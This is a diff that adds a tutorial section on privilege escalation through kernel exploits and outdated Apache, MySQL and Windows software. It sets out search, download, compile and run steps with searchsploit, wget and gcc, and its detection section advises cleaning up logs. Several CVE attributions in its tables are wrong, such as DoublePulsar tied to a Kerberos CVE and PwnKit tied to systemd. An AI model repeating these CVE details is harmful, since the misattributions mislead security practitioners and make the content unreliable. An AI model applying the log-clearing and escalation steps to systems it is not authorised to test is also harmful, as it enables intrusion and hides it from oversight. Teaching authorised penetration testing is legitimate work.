@@ -626,4 +626,596 @@ QUESTION 4: System has AV/IDS?
 
 ---
 
+# PART 2: COMMON PRIVILEGE ESCALATION VECTORS
+
+## Vector 1: Kernel Exploits
+
+### The Concept
+
+```
+Unpatched/Old Operating System
+    ↓
+Contains known security vulnerabilities
+    ↓
+Kernel vulnerability exists in release
+    ↓
+Exploit public CVE → Get root access
+```
+
+**Key Insight:**
+```
+Older systems = More vulnerabilities
+Unpatched systems = Known vulnerabilities
+Kernel exploits = Direct path to root
+```
+
+---
+
+### How Kernel Exploits Work
+
+**Strategy:**
+
+1. **Identify OS Version**
+   ```bash
+   $ uname -r
+   3.10.0-1127.el7.x86_64
+   # OR
+   $ cat /etc/os-release
+   Ubuntu 16.04 LTS
+   ```
+
+2. **Search for Known Exploits**
+   ```bash
+   # Method 1: Google the version
+   "3.10.0-1127 kernel exploit"
+   
+   # Method 2: Use SearchSploit
+   $ searchsploit 3.10.0 linux
+   
+   # Method 3: Check CVE databases
+   https://cve.mitre.org
+   https://nvd.nist.gov
+   ```
+
+3. **Find CVE Number**
+   ```
+   CVE-YEAR-NUMBER format
+   Example: CVE-2016-5195 (DirtyCow)
+   ```
+
+4. **Download/Build Exploit**
+   ```bash
+   # Find exploit code
+   # Compile if needed (usually C code)
+   $ gcc exploit.c -o exploit
+   ```
+
+5. **Run on Target**
+   ```bash
+   $ ./exploit
+   # Success: Root shell obtained
+   ```
+
+---
+
+### Real Example: DirtyCow (CVE-2016-5195)
+
+**Vulnerability:**
+```
+Affects: Linux kernels before 4.8.3
+Issue: Race condition in memory handling
+Impact: Privilege escalation to root
+```
+
+**Identification:**
+```bash
+$ uname -r
+3.10.0-514.el7.x86_64
+# Kernel version 3.10 → Vulnerable!
+```
+
+**Exploitation:**
+```bash
+$ searchsploit DirtyCow
+[*] DirtyCow CVE-2016-5195 Linux Privilege Escalation
+
+$ # Download and compile
+$ gcc -pthread dirty.c -o dirty -lutil
+$ ./dirty
+
+# Result: Root shell or backdoor user created
+```
+
+---
+
+### Linux Kernel Exploits: Common CVEs
+
+| CVE | Name | Affected | Impact |
+|-----|------|----------|--------|
+| **CVE-2016-5195** | DirtyCow | Linux < 4.8.3 | Privilege Escalation |
+| **CVE-2021-4034** | PwnKit | Linux (systemd) | Privilege Escalation |
+| **CVE-2021-22555** | Netfilter | Linux 4.x | Privilege Escalation |
+| **CVE-2019-1010317** | ptrace | Linux < 5.3 | Privilege Escalation |
+| **CVE-2017-1000112** | UFO | Linux < 4.13 | Privilege Escalation |
+
+---
+
+### Windows Kernel Exploits: Common CVEs
+
+| CVE | Name | Affected | Impact |
+|-----|------|----------|--------|
+| **CVE-2014-6324** | Kerberos DoublePulsar | Windows Server 2012 R2 | Privilege Escalation |
+| **CVE-2016-3225** | Win32k | Windows 7/8/10 | Privilege Escalation |
+| **CVE-2017-0005** | GDI | Windows 7/8/10 | Privilege Escalation |
+| **CVE-2018-8611** | Win32k | Windows 10 | Privilege Escalation |
+
+---
+
+### ⚠️ Critical Warnings: Kernel Exploits
+
+**Danger 1: System Instability**
+
+```
+Kernel exploits interact with core system components
+Buggy exploit → System crash
+Success might still cause instability
+Production systems at risk
+```
+
+**Best Practice:**
+```
+✓ Test in lab environment first
+✓ Understand what exploit does
+✓ Have rollback plan
+✓ Never on production without approval
+```
+
+---
+
+**Danger 2: Data Loss**
+
+```
+Kernel exploit crashes system
+Unsaved data lost
+Running processes terminated
+File system might be corrupted
+```
+
+**Mitigation:**
+```
+✓ Coordinate with client
+✓ Schedule during maintenance window
+✓ Have backups ready
+✓ Document your actions
+```
+
+---
+
+**Danger 3: Detection**
+
+```
+Kernel exploits create system events
+Crash = obvious sign of compromise
+Suspicious processes = detected
+Stability issues = admin investigation
+```
+
+**Solution:**
+```
+✓ Use stealthier exploits first
+✓ Use kernel exploit as last resort
+✓ Clean up logs if possible
+✓ Document reason for instability
+```
+
+---
+
+### Kernel Exploit Methodology
+
+**Step 1: Identify Version**
+```bash
+$ uname -a
+Linux target 3.10.0-514.el7.x86_64
+```
+
+**Step 2: Search for Vulnerabilities**
+```bash
+$ searchsploit 3.10.0
+# Or
+$ google "3.10.0 linux kernel exploit"
+```
+
+**Step 3: Assess Applicability**
+```
+- Is this the right kernel version?
+- Does exploit apply to your CPU architecture (x86/x64)?
+- Are dependencies available (gcc, etc.)?
+```
+
+**Step 4: Obtain Exploit**
+```bash
+# From SearchSploit
+$ searchsploit -m linux/local/40844.c
+
+# Or from GitHub/Exploit-DB
+$ wget https://raw.githubusercontent.com/.../exploit.c
+```
+
+**Step 5: Compile (if needed)**
+```bash
+$ gcc -o exploit exploit.c -pthread
+# Or
+$ python3 exploit.py
+# Or
+$ ./exploit.sh (already compiled)
+```
+
+**Step 6: Execute with Caution**
+```bash
+$ ./exploit
+# Monitor for crashes/errors
+# Check if root access achieved
+```
+
+**Step 7: Verify Success**
+```bash
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+# SUCCESS!
+```
+
+---
+
+## Vector 2: Vulnerable Software
+
+### The Concept
+
+```
+Installed outdated application
+    ↓
+Contains known security vulnerability
+    ↓
+Public exploit available
+    ↓
+Exploit vulnerability → Get root access
+```
+
+**Key Insight:**
+```
+Old software = Known vulnerabilities
+Public exploits available
+Often easier than kernel exploits
+```
+
+---
+
+### How to Find Installed Software
+
+**On Linux:**
+
+```bash
+# List all installed packages
+$ dpkg -l
+# Shows: package name, version, description
+
+# Example:
+ii  openssh-server    1:7.4p1-10
+ii  apache2           2.4.41-1
+ii  mysql-server      8.0.23-0
+```
+
+**Better formatting:**
+```bash
+$ dpkg -l | grep -i mysql
+ii  mysql-server      8.0.23-0
+```
+
+**Find specific version:**
+```bash
+$ dpkg -l | grep apache
+ii  apache2           2.4.41-1
+```
+
+---
+
+**On Windows:**
+
+```cmd
+# Check Program Files
+C:\> dir "C:\Program Files"
+C:\> dir "C:\Program Files (x86)"
+
+# Or use PowerShell
+PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
+```
+
+**See all installed software with versions:**
+```cmd
+C:\> wmic product list brief
+```
+
+---
+
+### Example: Vulnerable Apache Version
+
+**Discovered:**
+```bash
+$ dpkg -l | grep apache
+ii  apache2  2.4.10-1
+
+$ apache2 -v
+Server version: Apache/2.4.10 (Debian)
+```
+
+**Search for Exploits:**
+```bash
+$ searchsploit apache 2.4.10
+# Results:
+# - CVE-2021-41773 (Apache 2.4.50)
+# - CVE-2021-42013 (Apache 2.4.50)
+# ... many others
+
+# Or Google:
+# "apache 2.4.10 exploit"
+# "Apache 2.4.10 CVE"
+```
+
+**Check for Path Traversal:**
+```bash
+# Apache 2.4.49+ has path traversal
+# But 2.4.10 might have different vulns
+# Search for specific CVEs affecting 2.4.10
+```
+
+---
+
+### Example: Vulnerable MySQL Version
+
+**Discovered:**
+```bash
+$ mysql --version
+mysql  Ver 14.14 Distrib 5.7.20
+
+$ # This is old! Current is 8.0+
+```
+
+**Search for Exploits:**
+```bash
+$ searchsploit mysql 5.7.20
+# Results: Multiple privilege escalation vectors
+
+$ searchsploit "mysql 5.7" privilege escalation
+```
+
+**Common MySQL PrivEsc Vectors:**
+
+1. **UDF Exploitation**
+   ```
+   MySQL running as root
+   Can load custom libraries (UDF)
+   Create backdoor library
+   Execute commands as root
+   ```
+
+2. **Plugin Exploitation**
+   ```
+   Vulnerable MySQL plugins
+   Execute code through plugins
+   Gain root execution
+   ```
+
+---
+
+### How to Identify Vulnerable Software Versions
+
+**Method 1: Online Vulnerability Database**
+
+```
+1. Know the software: Apache, MySQL, PHP, etc.
+2. Know the version: 2.4.10, 5.7.20, 7.4.3, etc.
+3. Search CVE database:
+   https://cve.mitre.org/cgi-bin/cvename.cgi?name=
+   
+4. Check if vulnerabilities are available
+5. Check if public exploits exist
+```
+
+**Method 2: SearchSploit**
+
+```bash
+# Exact software + version
+$ searchsploit apache 2.4.10
+
+# Or multiple versions
+$ searchsploit "apache 2.4"
+
+# Look for:
+# - Local privilege escalation
+# - Remote code execution
+# - Configuration issues
+```
+
+**Method 3: GitHub Exploit Repositories**
+
+```
+Search GitHub for:
+"apache 2.4.10 exploit"
+"apache 2.4.10 rce"
+
+Many security researchers publish exploits on GitHub
+```
+
+---
+
+### Software Vulnerability Exploitation Workflow
+
+**Step 1: List Installed Software**
+
+Linux:
+```bash
+$ dpkg -l
+# Note all software and versions
+```
+
+Windows:
+```cmd
+C:\> Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
+```
+
+**Step 2: Note Interesting Software**
+
+```
+Look for:
+✓ Old versions (3+ years old)
+✓ Server software (Apache, MySQL, etc.)
+✓ Popular targets (PHP, Java, etc.)
+✓ Rarely updated (embedded systems, appliances)
+```
+
+**Step 3: Search for Vulnerabilities**
+
+```bash
+$ for app in apache2 mysql php; do
+    searchsploit "$app" | head -5
+  done
+```
+
+**Step 4: Assess Exploitability**
+
+```
+Questions to ask:
+- Does exploit apply to my version?
+- Is the vulnerability local or remote?
+- Do I have required permissions?
+- Are dependencies available?
+- How stable is the exploit?
+```
+
+**Step 5: Obtain and Verify Exploit**
+
+```bash
+# Download
+$ searchsploit -m path/to/exploit.c
+
+# Read the code
+$ cat exploit.c
+# Look for version check, dependencies, etc.
+
+# Compile if needed
+$ gcc -o exploit exploit.c
+```
+
+**Step 6: Execute and Verify**
+
+```bash
+$ ./exploit
+# Monitor output
+# Check for success indicators
+
+$ id
+# Should show elevated privileges
+```
+
+---
+
+## Common Vulnerable Software in Linux
+
+| Software | Vulnerable Versions | Common Exploit | Impact |
+|----------|-------------------|---------------|---------:|
+| **Apache** | 2.4.49-2.4.50 | Path Traversal | RCE/PrivEsc |
+| **MySQL/MariaDB** | 5.x, < 8.0.12 | UDF Loading | PrivEsc |
+| **PHP** | < 7.0.0 | Various | RCE/PrivEsc |
+| **sudo** | < 1.9.5 | Heap Overflow | PrivEsc |
+| **OpenSSH** | < 7.4 | Username Enumeration | Info Disclosure |
+| **Vim** | < 7.4.1157 | Modeline | RCE |
+
+---
+
+## Common Vulnerable Software in Windows
+
+| Software | Vulnerable Versions | Common Exploit | Impact |
+|----------|-------------------|---------------|---------:|
+| **IIS** | < 10.0 | Various | RCE/PrivEsc |
+| **SQL Server** | 2012, 2014 | UNC Path Injection | RCE |
+| **PowerShell** | < 5.0 | Execution Policy Bypass | RCE |
+| **WinRM** | Unpatched | Various | RCE |
+| **SMBv3** | Unpatched | Various | RCE |
+
+---
+
+## Priority: What to Look for First
+
+### High Priority (High Likelihood of Exploitation)
+
+```
+1. Kernel exploits (if old kernel)
+2. Apache/web server vulnerabilities
+3. Database software (MySQL, MSSQL)
+4. Sudo/privilege management issues
+5. Outdated scripting languages
+```
+
+### Medium Priority
+
+```
+6. Services running as root
+7. Installed development tools
+8. Custom applications
+9. Monitoring/logging software
+10. Backup utilities
+```
+
+### Low Priority (Harder to Exploit)
+
+```
+11. Client applications
+12. System utilities
+13. Recently patched software
+14. Niche software
+```
+
+---
+
+## Key Takeaways - Part 2: Common Vectors
+
+1. **Kernel exploits:**
+   - Identify OS version
+   - Search for known CVEs
+   - Test in lab first
+   - Use as last resort (unstable)
+
+2. **Vulnerable software:**
+   - Identify all installed packages
+   - Check version numbers
+   - Search for public exploits
+   - Often easier than kernel exploits
+
+3. **Finding software:**
+   - Linux: `dpkg -l`
+   - Windows: `C:\Program Files`, PowerShell, WMIC
+   - Note versions carefully
+
+4. **Exploitation workflow:**
+   - Identify software
+   - Find vulnerability
+   - Obtain exploit
+   - Test in lab
+   - Execute carefully
+   - Verify success
+
+5. **Priority approach:**
+   - Kernel first (if applicable)
+   - Then software exploits
+   - Then other vectors
+   - Use least disruptive first
+
+6. **Safety considerations:**
+   - Lab test first
+   - Get explicit approval
+   - Have rollback plan
+   - Monitor for crashes
+   - Document everything
+
+---
+
 ## Notes
